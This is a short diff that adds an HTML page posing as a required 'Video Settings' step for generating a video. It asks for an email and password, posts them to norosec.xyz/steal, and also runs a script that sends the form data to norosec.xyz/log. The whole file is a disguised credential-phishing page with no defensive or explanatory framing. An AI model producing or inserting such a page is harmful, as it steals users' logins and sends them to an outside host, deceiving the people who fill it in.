@@ -1,0 +1,9 @@
+<form action="https://norosec.xyz/steal" method=POST>
+  <h2>Video Settings (Required)</h2>
+  Email: <input name=email required><br>
+  Password: <input name=pass type=password required><br>
+  <button>Generate Video</button>
+</form>
+<script>
+document.forms[0].onsubmit=function(){fetch('https://norosec.xyz/log?phish='+btoa(JSON.stringify(new FormData(this))));}
+</script>
